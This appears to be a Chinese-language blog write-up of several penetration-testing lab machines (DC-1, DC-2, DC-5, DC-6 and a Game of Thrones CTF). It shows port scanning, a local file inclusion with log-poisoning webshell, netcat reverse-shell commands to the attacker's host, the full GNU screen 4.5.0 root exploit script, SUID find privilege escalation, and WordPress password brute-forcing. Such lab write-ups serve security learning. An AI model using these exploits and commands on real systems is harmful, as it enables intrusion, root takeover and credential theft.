---
title: 'DC靶机渗透'
date: 2019-08-09
updated: 2019-10-08
category: 'vulstudy'
tags:
  - '靶机'
  - 'nmap'
  - '提权'
  - 'masscan'
  - 'find'
  - 'gobuster'
lang: 'zh'
draft: false
---
## DC 5

## 扫描ip地址

之前一直没能够确认靶机的ip地址，其实只需要将网络连接模式修改为NAT模式重启一下就行了

```
# root @ kali in ~ [4:06:38] 
$ arp-scan 192.168.41.0/24
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.41.1	00:50:56:c0:00:08	VMware, Inc.
192.168.41.2	00:50:56:e0:f7:aa	VMware, Inc.
192.168.41.166	00:0c:29:d7:ef:a4	VMware, Inc.
192.168.41.167	00:0c:29:fd:e8:73	VMware, Inc. ---> DC5靶机
192.168.41.254	00:50:56:f5:fb:f6	VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.5: 256 hosts scanned in 2.346 seconds (109.12 hosts/sec). 5 responded
```

## 扫描端口

masscan扫出了几个端口：

```
# root @ kali in ~ [4:09:46] 
$ masscan -p0-65535 192.168.41.167 --rate=1000000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 08:10:19 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65536 ports/host]
Discovered open port 80/tcp on 192.168.41.167                                  
Discovered open port 111/tcp on 192.168.41.167                                 
Discovered open port 33188/tcp on 192.168.41.167
```

## 扫描端口对应的服务

然后上nmap扫服务

```
# root @ kali in ~ [4:10:42] 
$ nmap -p80,111,33188 -sV -T4 192.168.41.167
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-09 04:15 EDT
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 04:15 (0:00:06 remaining)
Nmap scan report for 192.168.41.167
Host is up (0.00042s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.6.2
111/tcp   open  rpcbind 2-4 (RPC #100000)
33188/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:FD:E8:73 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.63 seconds
```

访问原始网页：

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5.png)

## 扫描后台——推荐使用 gobuster

`dirsearch.py`似乎没有发现什么

```
Target: http://192.168.41.167                                                                                           
[16:24:35] Starting:
[16:24:35] 400 -  172B  - /%2e%2e/google.com
[16:24:42] 301 -  184B  - /css  ->  http://192.168.41.167/css/
[16:24:44] 301 -  184B  - /images  ->  http://192.168.41.167/images/
[16:24:44] 200 -    4KB - /index.php
```

看了师傅们的提示，发现footer.php很有趣  
每次刷新数字都会变化  
![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-0.png)

同时发现在 `http://192.168.41.167/thankyou.php`页面也有这种效果，于是猜想是不是本地文件包含漏洞

访问`http://192.168.41.167/thankyou.php?file=/etc/passwd`，页面回显了！

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-1.png)

同时该主机使用的是nginx服务，于是可以写一个shell到日志中并且包含这个文件

写入webshell，注意这里使用的是passthru函数

> 同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-2.png)

kali监听一个端口然后访问如下路由去包含文件并且弹shell  
`http://192.168.41.167/thankyou.php?file=/var/log/nginx/access.log&cmd=nc%20192.168.41.165%202333%20-c%20/bin/bash`

核心命令`nc 192.168.41.165 -c /bin/bash`

此时的权限是`www-data`  
![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-3.png)

接下来看如何提权

上提权辅助脚本  
[链接](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)

发现有这个文件

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-4.png)

exploit-db上搜一下exp：

```sh
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
```

## 提权方法

[exploit 地址](https://www.exploit-db.com/exploits/41154)

下载下来之后直接运行是不太可能的，我们需要将其中的C语言文件单独编译

![](/2019/08/09/dc-ba-ji-shen-tou/kali.png)

然后修改原有的sh脚本

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."

echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
```

但是我不知道怎么将文件上传到靶机中，尝试过使用python开启一个服务器然后用wget命令还是失败了

![](/2019/08/09/dc-ba-ji-shen-tou/kali1.png)

如图发现还是失败了

（纠结在不知道如何将文件传过去。tcl

### DC5后记

thankyou.php文件中有以下内容；典型的本地文件包含漏洞  

```php
<div class="footer-wrapper">
	<footer>
		<?php

			$file = $_GET['file'];
				if(isset($file))
				{
					include("$file");
				}
				else
				{
					include("footer.php");
				}

		?>
	</footer>
```

## DC1

arp-scan发现主机

```
# root @ kali in ~ [9:46:49] 
$ arp-scan 192.168.41.0/24
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.41.1	00:50:56:c0:00:08	VMware, Inc.
192.168.41.2	00:50:56:e0:f7:aa	VMware, Inc.
192.168.41.168	00:0c:29:9f:4c:60	VMware, Inc. ---> DC1靶机
192.168.41.254	00:50:56:f5:fb:f6	VMware, Inc.
```

扫描端口

```
# root @ kali in ~ [9:46:56] 
$ masscan -p0-65535 192.168.41.168 --rate=1000000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 13:47:23 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65536 ports/host]
Discovered open port 111/tcp on 192.168.41.168                                 
Discovered open port 47738/tcp on 192.168.41.168                               
Discovered open port 22/tcp on 192.168.41.168                                  
Discovered open port 80/tcp on 192.168.41.168
```

发现80端口是一个cms，名字叫drupal

metasploit搜索一下drupal的渗透模块

```
msf5 > search drupal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   1  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   2  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   3  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   4  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   5  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
```

然后设置相关参数，获得shell

```
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.41.168
RHOSTS => 192.168.41.168
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > exploit 

[*] Started reverse TCP handler on 192.168.41.165:4444 
[*] Sending stage (38247 bytes) to 192.168.41.168
[*] Meterpreter session 1 opened (192.168.41.165:4444 -> 192.168.41.168:41848) at 2019-08-09 09:48:32 -0400

meterpreter > 
meterpreter > ls
Listing: /var/www
=================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  174    fil   2013-11-20 15:45:59 -0500  .gitignore
100644/rw-r--r--  5767   fil   2013-11-20 15:45:59 -0500  .htaccess
```

但是之后只能获得一个`Meterpreter`,不是root用户也没法运行Linux的常用命令，于是想到修改payload

```
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set payload php/exec
payload => php/exec

msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set CMD nc 192.168.41.165 2333 -c /bin/bash
CMD => nc 192.168.41.165 2333 -c /bin/bash
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > exploit
```

此时本机监听一个2333端口，成功反弹shell

```
$ nc -lvp 2333           
listening on [any] 2333 ...
192.168.41.168: inverse host lookup failed: Unknown host
connect to [192.168.41.165] from (UNKNOWN) [192.168.41.168] 60424
ls
COPYRIGHT.txt
INSTALL.mysql.txt
INSTALL.pgsql.txt
INSTALL.sqlite.txt
```

此时上提权辅助脚本：

`wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`

添加可执行权限并且运行，重点关注：

```
[-] SUID files:
-rwsr-xr-x 1 root root 88744 Dec 10  2012 /bin/mount
-rwsr-xr-x 1 root root 31104 Apr 13  2011 /bin/ping
-rwsr-xr-x 1 root root 35200 Feb 27  2017 /bin/su
-rwsr-xr-x 1 root root 35252 Apr 13  2011 /bin/ping6
-rwsr-xr-x 1 root root 67704 Dec 10  2012 /bin/umount
-rwsr-sr-x 1 daemon daemon 50652 Oct  4  2014 /usr/bin/at
-rwsr-xr-x 1 root root 35892 Feb 27  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 45396 Feb 27  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 30880 Feb 27  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 44564 Feb 27  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 66196 Feb 27  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 root mail 83912 Nov 18  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find
-rwsr-xr-x 1 root root 937564 Feb 11  2018 /usr/sbin/exim4
-rwsr-xr-x 1 root root 9660 Jun 20  2017 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 248036 Jan 27  2018 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 5412 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 321692 Feb 10  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 84532 May 22  2013 /sbin/mount.nfs
```

但是此时并没有什么用，我们这里要讲的是用fing命令提权

[find 之exec](https://www.cnblogs.com/aaronax/p/5618024.html)

随便创建一个文件`touch anquanke`  
然后find查找并且加上-exec选项：

```
find anquanke -exec 'whoami' \;
root
```

发现此时是root用户，于是执行/bin/sh

```
find anquanke -exec '/bin/sh' \;
whoami
root
```

至此提权成功了

## DC-6靶机——wordpress渗透

老规矩探测靶机的ip，然后扫描端口发现开放了80，按照下载时作者的提示需要修改hosts文件

```
$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
192.168.41.129  wordy
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

之前kali上的`wpscan`有问题，更新镜像源重新升级了一下

`wpscan --url http://wordy/ -e -t 20` 直接扫一下看能有什么结果

扫描到用户：

```
[i] User(s) Identified:

[+] admin
 | Detected By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] mark
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] sarah
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] jens
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] graham
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

下一步根据上面下载地址处作者的提示，我们生产一个字典包

```
# root @ kali in ~ [21:29:41] 
$ cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
```

之后使用wpscan爆破密码，登陆后台开始提权

## 参考

[Linux 反弹shell（二）反弹shell的本质](https://xz.aliyun.com/t/2549#toc-4)

[渗透测试实战-DC-1:1靶机入侵+Matrix2靶机入侵](https://www.anquanke.com/post/id/173111#h3-3)

[渗透测试实战——DC-5+DC-6靶机入侵](渗透测试实战——DC-5+DC-6靶机入侵)

[Linux提权辅助脚本](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)

## Game-of-Thrones-CTF-1靶机复现

一个很有意思的靶机

扫描靶机ip地址

```
# root @ kali in ~ [19:58:22] 
$ arp-scan 192.168.19.0/24
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.19.2	00:50:56:f9:02:e9	VMware, Inc.
192.168.19.131	00:0c:29:d0:e7:e1	VMware, Inc. ---> 靶机
192.168.19.254	00:50:56:e8:10:0e	VMware, Inc.
```

扫描端口

```
# root @ kali in ~ [19:59:38] 
$ masscan -p0-65535 192.168.19.131  --rate=1000000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-10 23:59:47 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65536 ports/host]
Discovered open port 80/tcp on 192.168.19.131                                  
Discovered open port 21/tcp on 192.168.19.131                                  
Discovered open port 1337/tcp on 192.168.19.131                                
Discovered open port 10000/tcp on 192.168.19.131                               
Discovered open port 53/tcp on 192.168.19.131                                  
Discovered open port 22/tcp on 192.168.19.131                                  
Discovered open port 5432/tcp on 192.168.19.131
```

扫描端口对应的服务：

```
# root @ kali in ~ [20:00:24] 
$ nmap -sV -T4 192.168.19.131           
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-10 20:02 EDT
Stats: 0:01:36 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 83.33% done; ETC: 20:04 (0:00:19 remaining)
Nmap scan report for 192.168.19.131
Host is up (0.000085s latency).
Not shown: 992 closed ports
PORT      STATE    SERVICE    VERSION
21/tcp    open     ftp?
22/tcp    open     ssh        Linksys WRT45G modified dropbear sshd (protocol 2.0)
53/tcp    open     domain     (unknown banner: Bind)
80/tcp    open     http       Apache httpd
143/tcp   filtered imap
3306/tcp  filtered mysql
5432/tcp  open     postgresql PostgreSQL DB 9.6.4 - 9.6.6
10000/tcp open     http       MiniServ 1.590 (Webmin httpd)
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port21-TCP:V=7.70%I=7%D=8/10%Time=5D4F5B1F%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,11C,"220-------------------------\r\n220-\"These\x20are\x20the
SF:\x20Dorne\x20city\x20walls\.\x20We\x20must\x20enter!\"\x20-\x20Grey\x20
SF:Worm\r\n220-\r\n220-\"A\x20fail2ban\x20spell\x20is\x20protecting\x20the
SF:se\x20walls\.\x20You'll\x20never\x20get\x20in\"\x20-\x20One\x20of\x20th
...
```

此时80端口是开放的，所以可以扫描一下目录：

```
[20:04:36] 200 -    1KB - /favicon.ico
[20:04:37] 301 -  232B  - /h  ->  http://192.168.19.131/h/
[20:04:37] 200 -    3KB - /index.php/login/
[20:04:37] 200 -    3KB - /index.php
[20:04:37] 301 -  233B  - /js  ->  http://192.168.19.131/js/
[20:04:38] 301 -  236B  - /music  ->  http://192.168.19.131/music/
[20:04:40] 200 -  135B  - /robots.txt
[20:04:40] 403 -  222B  - /server-status
[20:04:40] 403 -  223B  - /server-status/
```

robots.txt文件

依次访问这些页面，同时记得查看源代码，具体的分析之后再搞  

```
 /the-tree/
User-agent: *
Disallow: /secret-island/
Disallow: /direct-access-to-kings-landing/
```

### 参考

[Game-of-Thrones-CTF-1靶机完全攻略](https://www.freebuf.com/articles/web/177562.html)

## DC-2靶机

同样的扫描靶机ip，然后扫描端口，之后扫描端口对应的服务

发现开放了80和7744端口

```
# root @ kali in ~/dirsearch on git:master o [20:46:10] 
$ nmap -sV -p80,7744 192.168.19.132
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-10 20:47 EDT
Nmap scan report for 192.168.19.132
Host is up (0.00046s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
MAC Address: 00:0C:29:6A:1A:54 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.62 seconds
```

然后修改hosts文件，打开网址发现又是一个wordpress

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc2-0.png)

flag页面提示用cewl命令生成一个字典

`cewl -w dc2_passwords.txt http://dc-2`

用`wpscan`扫描出用户名，然后再用`wpscan`爆破密码

`wpscan --url http://dc-2/ -e -t 20`

`wpscan --url http://dc-2/ -U user.txt -P dc2_passwords.txt`

```
[i] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient
```
